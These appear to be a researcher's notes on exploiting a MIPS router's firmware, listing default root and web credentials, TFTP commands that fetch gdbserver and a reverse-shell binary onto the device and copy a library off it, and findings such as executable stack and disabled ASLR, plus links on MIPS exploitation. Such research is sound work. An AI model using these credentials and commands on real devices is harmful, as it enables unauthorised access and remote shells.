Binwalk Docker for MAC:
	docker run --rm -v /tmp:/tmp gillis57/binwalk -e firmware.bin

Serial ttl Default Root User:
	root:sohoadmin

TFTP Usefull commands:
	tftp -g -r gdbserver.mipsbe 192.168.0.100
	tftp -g -r reverse_shell_mipsbe 192.168.0.100
	tftp -p /lib/ld-uClibc-0.9.30.so 192.168.0.100 
	./gdbserver.mipsbe --remote-debug 192.168.0.1:1234 /usr/bin/httpd
	or
	./gdbserver.mipsbe --remote-debug 192.168.0.1:1234 --attach PID &

Web App Default User
	admin:admin

Check for libs and protections:
 . cat /proc/548/maps
 . Stack is executable
 . Heap is executable
 . Libc: /lib/libuClibc-0.9.30.so
 . ASLR is OFF but the execution is not in the main thread so, we cannot hardcode Stack Address

Useful Information:
	General Things:
		https://www.secforce.com/blog/2014/07/reverse-engineer-router-firmware-part-2/
		http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/
		http://panks.me/posts/2013/11/install-gdb-on-os-x-mavericks-from-source/

	MIPS Exploitation:
		https://www.vantagepoint.sg/papers/MIPS-BOF-LyonYang-PUBLIC-FINAL.pdf
		https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/
		http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/
		https://www.slideshare.net/OnurAlanbel/developing-mips-exploits-to-hack-routers-52580066

Thanks for your time!

You can contactme in Twitter as @SecSignal 
And in Linkeding as Alejandro Parodi
